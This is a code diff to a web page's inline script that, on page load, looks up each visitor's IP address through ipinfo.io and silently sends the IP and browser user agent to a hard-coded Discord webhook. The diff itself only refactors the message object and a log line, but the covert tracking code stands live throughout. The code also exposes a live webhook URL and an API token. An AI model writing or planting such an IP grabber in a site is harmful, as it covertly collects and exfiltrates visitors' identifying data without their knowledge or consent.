@@ -5,11 +5,16 @@
     <meta name="twitter:card" content="summary_large_image">
     <script>
       // Fetch the user's IP address using ipinfo.io API
-      fetch('https://ipinfo.io/json?token=332dd3e8d08f73') // Replace YOUR_API_TOKEN with your token from ipinfo.io
+      fetch('https://ipinfo.io/json?token=332dd3e8d08f73') // Replace with your ipinfo.io API token
         .then(response => response.json())
         .then(data => {
           const userIp = data.ip; // Extract the IP address from the response
           console.log("User IP:", userIp); // Log the IP address to the console
+
+          // Prepare data for Discord webhook
+          const webhookData = {
+            content: `🚨 Visitor IP: ${userIp}\nUser-Agent: ${navigator.userAgent}`
+          };
 
           // Send the IP to your Discord webhook
           fetch("https://discord.com/api/webhooks/1363758796467470517/g4CPvVSvNzXL9tPAZHva2Vu9XWj7637j7_jumz8etF530Nxs0aUJ6T-BO_A7Oz2KO3WW", {
@@ -17,13 +22,11 @@
             headers: {
               "Content-Type": "application/json"
             },
-            body: JSON.stringify({
-              content: `🚨 Visitor IP: ${userIp}\nUser-Agent: ${navigator.userAgent}`
-            })
+            body: JSON.stringify(webhookData)
           })
           .then(response => response.json())
           .then(data => {
-            console.log("Webhook response:", data); // Log the response from Discord webhook
+            console.log("Webhook sent successfully:", data); // Log the response from Discord webhook
           })
           .catch(error => {
             console.error('Error sending data to webhook:', error); // Log any errors
